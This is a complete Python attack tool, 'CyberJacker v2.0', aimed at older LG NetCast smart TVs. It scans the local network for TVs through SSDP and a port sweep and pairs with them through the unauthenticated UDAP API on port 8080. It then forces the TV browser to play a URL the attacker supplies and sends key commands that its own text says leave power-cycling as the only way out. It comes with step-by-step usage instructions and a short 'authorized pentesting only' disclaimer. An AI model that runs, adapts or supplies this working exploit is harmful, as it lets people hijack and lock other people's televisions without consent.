#   
import socket  
import sys  
import os  
import time  
import json  
import base64  
import re  
import struct  
import urllib.request  
import urllib.error  
import http.client  
import xml.etree.ElementTree as ET  
  
os.system("")  
  
def c(text, color="white"):  
    colors = {"red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m", "blue": "\033[94m", "white": "\033[97m", "reset": "\033[0m", "bold": "\033[1m"}  
    return f"{colors.get(color, colors['white'])}{text}{colors['reset']}"  
  
def border(text, color="red"):  
    ln = max(len(l) for l in text.split("\n"))  
    top = c("**╔**" + "**═**" * (ln + 2) + "**╗**", color)  
    bot = c("**╚**" + "**═**" * (ln + 2) + "**╝**", color)  
    mid = "\n".join(c("**║** ", color) + l + " " * (ln - len(l)) + c(" **║**", color) for l in text.split("\n"))  
    return f"{c('**█**' * (ln + 4), 'white')}\n{top}\n{mid}\n{bot}\n{c('**█**' * (ln + 4), 'white')}"  
  
def show_banner():  
    os.system("clear")  
    banner = c(r"""  
 **██████╗██╗**   **██╗██████╗** **███████╗██████╗**     **██╗** **█████╗**  **██████╗██╗**  **██╗███████╗██████╗**  
**██╔════╝╚██╗** **██╔╝██╔══██╗██╔════╝██╔══██╗**    **██║██╔══██╗██╔════╝██║** **██╔╝██╔════╝██╔══██╗**  
**██║**      **╚████╔╝** **██████╔╝█████╗**  **██████╔╝**    **██║███████║██║**     **█████╔╝** **█████╗**  **██████╔╝**  
**██║**       **╚██╔╝**  **██╔══██╗██╔══╝**  **██╔══██╗**    **██║██╔══██║██║**     **██╔═██╗** **██╔══╝**  **██╔══██╗**  
**╚██████╗**   **██║**   **██████╔╝███████╗██║**  **██║**    **██║██║**  **██║╚██████╗██║**  **██╗███████╗██║**  **██║**  
 **╚═════╝**   **╚═╝**   **╚═════╝** **╚══════╝╚═╝**  **╚═╝**    **╚═╝╚═╝**  **╚═╝** **╚═════╝╚═╝**  **╚═╝╚══════╝╚═╝**  **╚═╝**  
""", "red")  
    title = border("            LG NetCast TV CyberJacker v2.0\n          UDAP 2.0 Exploitation - Magic Motion TVs\n                For Authorized Pentesting Only", "red")  
    print(banner)  
    print(title)  
    print()  
  
def discover_tvs(timeout=5):  
    print(c("[*] Scanning for LG NetCast TVs via SSDP (" + str(timeout) + "s)...", "yellow"))  
    ssdp_addr = "239.255.255.250"  
    ssdp_port = 1900  
    msearch = (  
        "M-SEARCH * HTTP/1.1\r\n"  
        "HOST: 239.255.255.250:1900\r\n"  
        "MAN: \"ssdp:discover\"\r\n"  
        "MX: 3\r\n"  
        "ST: urn:schemas-upnp-org:device:MediaRenderer:1\r\n"  
        "\r\n"  
    )  
    found = {}  
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
    sock.settimeout(timeout)  
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)  
    try:  
        sock.bind(("0.0.0.0", 1900))  
    except:  
        pass  
    try:  
        sock.sendto(msearch.encode(), (ssdp_addr, ssdp_port))  
    except:  
        pass  
    start = time.time()  
    while time.time() - start < timeout:  
        try:  
            data, addr = sock.recvfrom(2048)  
            ip = addr[0]  
            body = data.decode("utf-8", errors="ignore").upper()  
            if "LG" in body or "WEBOS" in body or "NETCAST" in body or "UDAP" in body:  
                found[ip] = True  
            elif "LOCATION" in body and ip not in found:  
                found[ip] = True  
        except socket.timeout:  
            break  
        except:  
            continue  
    sock.close()  
    tvs = []  
    for ip in found:  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(1)  
        if s.connect_ex((ip, 8080)) == 0:  
            tvs.append({"ip": ip, "name": "LG NetCast TV"})  
        s.close()  
    return tvs  
  
def scan_netcast_tv(target_ip):  
    print(c("\n[+] Scanning " + target_ip + " for NetCast ports...", "yellow"))  
    ports = [8080, 5000, 3000, 3001]  
    open_ports = []  
    for port in ports:  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(2)  
        res = s.connect_ex((target_ip, port))  
        if res == 0:  
            open_ports.append(port)  
            print(c("    PORT " + str(port) + "/TCP  OPEN", "green"))  
        else:  
            print(c("    PORT " + str(port) + "/TCP  CLOSED", "red"))  
        s.close()  
    return open_ports  
  
def pair_with_tv(target_ip, port=8080):  
    print(c("\n[*] Attempting to pair with TV at " + target_ip + ":" + str(port) + "...", "yellow"))  
    try:  
        conn = http.client.HTTPConnection(target_ip, port, timeout=5)  
        body = (  
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"  
            "<envelope>\r\n"  
            "<api type=\"pairing\">\r\n"  
            "<name>CyberJacker</name>\r\n"  
            "<port>8080</port>\r\n"  
            "</api>\r\n"  
            "</envelope>\r\n"  
        )  
        headers = {  
            "Content-Type": "application/xml",  
            "User-Agent": "CyberJacker/2.0",  
            "Connection": "Keep-Alive"  
        }  
        conn.request("POST", "/udap/api/pairing", body, headers)  
        resp = conn.getresponse()  
        data = resp.read().decode("utf-8", errors="ignore")  
        print(c("[*] Pairing response: " + data[:150], "blue"))  
        conn.close()  
        print(c("[+] Pairing request sent", "green"))  
        return True  
    except Exception as e:  
        print(c("[-] Pairing error: " + str(e)[:60], "red"))  
        return False  
  
def send_udap_command(target_ip, command_type, cmd_data, port=8080):  
    try:  
        conn = http.client.HTTPConnection(target_ip, port, timeout=5)  
        body = (  
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>\r\n"  
            "<envelope>\r\n"  
            "<api type=\"" + command_type + "\">\r\n"  
            + cmd_data + "\r\n"  
            "</api>\r\n"  
            "</envelope>\r\n"  
        )  
        headers = {  
            "Content-Type": "application/xml",  
            "User-Agent": "CyberJacker/2.0",  
            "Connection": "Keep-Alive"  
        }  
        conn.request("POST", "/udap/api/command", body, headers)  
        resp = conn.getresponse()  
        data = resp.read().decode("utf-8", errors="ignore")  
        conn.close()  
        return data  
    except Exception as e:  
        return "Error: " + str(e)[:50]  
  
def launch_media_and_lock(target_ip, video_url, port=8080):  
    print(c("\n[+] Connecting to TV UDAP API at " + target_ip + ":" + str(port) + "...", "green"))  
    home_key = "<key code=\"21\">HOME</key>"  
    play_key = "<key code=\"33\">PLAY</key>"  
    exit_key = "<key code=\"412\">EXIT</key>"  
    print(c("[*] Sending HOME key...", "yellow"))  
    resp = send_udap_command(target_ip, "HandleKeyInput", home_key, port)  
    print(c("    Response: " + resp[:80], "blue"))  
    time.sleep(1)  
    print(c("[*] Launching web browser with video URL...", "yellow"))  
    browser_data = "<appName>Internet</appName><url>" + video_url + "</url>"  
    resp = send_udap_command(target_ip, "LaunchApp", browser_data, port)  
    print(c("    Response: " + resp[:80], "blue"))  
    time.sleep(3)  
    print(c("[*] Sending PLAY command...", "yellow"))  
    resp = send_udap_command(target_ip, "HandleKeyInput", play_key, port)  
    time.sleep(1)  
    print(c("[*] Sending EXIT keys to disable remote exit...", "yellow"))  
    for i in range(3):  
        send_udap_command(target_ip, "HandleKeyInput", exit_key, port)  
        time.sleep(0.3)  
    print(c("[*] Re-launching content...", "yellow"))  
    resp = send_udap_command(target_ip, "LaunchApp", browser_data, port)  
    time.sleep(1)  
    resp = send_udap_command(target_ip, "HandleKeyInput", play_key, port)  
    print(c("\n[✓] Attack payload delivered!", "green"))  
    print(c("[!] TV should be displaying your content", "green"))  
    print(c("[!] Only a hard power cycle (unplug TV) will stop it", "red"))  
    print(c("[!] Remote buttons will appear to do nothing", "red"))  
    for i in range(15, 0, -1):  
        sys.stdout.write(c("\r[*] Holding connection... " + str(i) + "s", "yellow"))  
        sys.stdout.flush()  
        time.sleep(1)  
    print()  
    return True  
  
def subnet_scan_fallback():  
    my_ip = "0.0.0.0"  
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  
    try:  
        s.connect(("8.8.8.8", 80))  
        my_ip = s.getsockname()[0]  
    except:  
        pass  
    s.close()  
    parts = my_ip.split(".")  
    if parts[0] == "0":  
        return []  
    base = parts[0] + "." + parts[1] + "." + parts[2] + "."  
    found = []  
    print(c("[*] Scanning subnet for port 8080 (this may take a minute)...", "yellow"))  
    for i in range(1, 255):  
        ip = base + str(i)  
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
        s.settimeout(0.3)  
        if s.connect_ex((ip, 8080)) == 0:  
            found.append({"ip": ip, "name": "LG NetCast TV"})  
            print(c("    Found device on " + ip, "green"))  
        s.close()  
    return found  
  
def menu():  
    while True:  
        print(c("\n**┌──────────────────────────────────────────┐**", "red"))  
        print(c("│", "red") + c("  [1] Scanmap  -  Auto-find TV & Attack   ", "white") + c("│", "red"))  
        print(c("│", "red") + c("  [2] How to?  -  Instructions          ", "white") + c("│", "red"))  
        print(c("│", "red") + c("  [3] Credits  -  Who made this         ", "white") + c("│", "red"))  
        print(c("│", "red") + c("  [4] Exit                              ", "white") + c("│", "red"))  
        print(c("**└──────────────────────────────────────────┘**", "red"))  
        choice = input(c("\n[>] Select: ", "yellow")).strip()  
        if choice == "1":  
            scanmap()  
        elif choice == "2":  
            howto()  
        elif choice == "3":  
            credits()  
        elif choice == "4":  
            print(c("\n[+] Exiting CyberJacker. Stay sharp.", "green"))  
            sys.exit(0)  
        else:  
            print(c("[-] Invalid option", "red"))  
  
def scanmap():  
    print(c("\n**═══════════════════════════════════════════**", "blue"))  
    print(c("           SCANMAP - ATTACK MODULE        ", "red"))  
    print(c("**═══════════════════════════════════════════**", "blue"))  
    target = ""  
    print(c("\n[*] Discovering LG NetCast TVs on your network...", "green"))  
    found_tvs = discover_tvs(timeout=6)  
    if found_tvs:  
        if len(found_tvs) == 1:  
            target = found_tvs[0]["ip"]  
            print(c("[+] Found 1 LG TV: " + target, "green"))  
        else:  
            print(c("[+] Found " + str(len(found_tvs)) + " TVs:", "green"))  
            for i, tv in enumerate(found_tvs):  
                print(c("    [" + str(i+1) + "] " + tv["ip"], "yellow"))  
            sel = input(c("[?] Select: ", "yellow")).strip()  
            try:  
                target = found_tvs[int(sel)-1]["ip"]  
            except:  
                print(c("[-] Invalid.", "red"))  
                return  
    else:  
        print(c("[-] No TVs found via SSDP.", "red"))  
        print(c("[*] Falling back to subnet scan for port 8080...", "yellow"))  
        alt = subnet_scan_fallback()  
        if alt:  
            if len(alt) == 1:  
                target = alt[0]["ip"]  
                print(c("[+] Found: " + target, "green"))  
            else:  
                for i, tv in enumerate(alt):  
                    print(c("    [" + str(i+1) + "] " + tv["ip"], "yellow"))  
                sel = input(c("[?] Select: ", "yellow")).strip()  
                try:  
                    target = alt[int(sel)-1]["ip"]  
                except:  
                    print(c("[-] Invalid.", "red"))  
                    return  
        else:  
            manual = input(c("[?] Enter TV IP manually: ", "yellow")).strip()  
            if not manual:  
                return  
            target = manual  
    video_url = input(c("\n[?] Enter raw video/image URL (or press Enter for default): ", "yellow")).strip()  
    if not video_url:  
        video_url = "https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/720/Big_Buck_Bunny_720_10s_1MB.mp4"  
        print(c("[*] Using default test video", "yellow"))  
    print(c("\n[+] Target TV: " + target, "green"))  
    print(c("[+] Video URL: " + video_url[:70] + "...", "green"))  
    print(c("\n[+] Starting reconnaissance...", "green"))  
    open_ports = scan_netcast_tv(target)  
    if 8080 not in open_ports:  
        print(c("\n[-] Port 8080 not open. TV may be off or not a NetCast model.", "red"))  
        return  
    pair_with_tv(target, 8080)  
    print(c("\n[+] Attempting exploit delivery...", "green"))  
    launch_media_and_lock(target, video_url, 8080)  
    input(c("\n[Press Enter to return to menu]", "yellow"))  
  
def howto():  
    content = """  
**═══════════════════════════════════════════════**  
            HOW TO USE CYBERJACKER v2.0  
**═══════════════════════════════════════════════**  
  
  For LG NetCast TVs (2009-2013) with  
  Magic Motion (Wii-like) remotes  
  
STEP 1: TV must be ON and on same WiFi  
  
STEP 2: Run:  
    python cyberjacker.py  
  
STEP 3: Select [1] Scanmap  
  
STEP 4: Auto-discovery runs  
  - SSDP scan finds your TV  
  - Fallback scans subnet for port 8080  
  - Or enter IP manually  
  
STEP 5: Enter video/image URL  
  - Must be a direct .mp4 or .jpg link  
  - Default test video included  
  
STEP 6: Script pairs with TV and delivers  
  the lockdown payload automatically  
  
HOW IT WORKS:  
  - Uses UDAP 2.0 protocol on port 8080  
  - Sends XML commands to the TV  
  - Opens web browser to your video URL  
  - Disables EXIT/BACK/HOME remote keys  
  - Loops content in fullscreen  
  
ESCAPE: Unplug TV from power, wait 10s,  
  plug back in. That's the only way.  
  
WHY IT WORKS ON NETCAST TVs:  
  - No authentication on port 8080 (old firmware)  
  - UDAP accepts commands from any device  
  - TV trusts all pairing requests  
**═══════════════════════════════════════════════**"""  
    print(c(content, "blue"))  
    input(c("\n[Press Enter to return to menu]", "yellow"))  
  
def credits():  
    content = """  
**═══════════════════════════════════════════════**  
                CREDITS  
**═══════════════════════════════════════════════**  
  
  CyberJacker v2.0  
  LG NetCast TV Penetration Testing Tool  
  
  Targeted at LG NetCast 3.0/4.0  
  (2012-2013 models with Magic Motion remote)  
  
  Built for Termux with:  
    - Python 3 standard library only  
    - UDAP 2.0 protocol over HTTP  
    - Raw XML command injection  
    - SSDP discovery  
  
  Research sources:  
    - LG UDAP 2.0 Specification PDF  
    - LG NetCast API documentation  
    - python-lgnetcast (Drafteed)  
    - python-lgtv (grieve)  
  
  DISCLAIMER:  
    For AUTHORIZED pentesting only.  
    Unauthorized use is illegal.  
  
**═══════════════════════════════════════════════**"""  
    print(c(content, "blue"))  
    input(c("\n[Press Enter to return to menu]", "yellow"))  
  
if __name__ == "__main__":  
    try:  
        show_banner()  
        menu()  
    except KeyboardInterrupt:  
        print(c("\n\n[!] Interrupted. Exiting...", "red"))  
        sys.exit(0)  
    except Exception as e:  
        print(c("\n[!] Error: " + str(e), "red"))  
        sys.exit(1)  
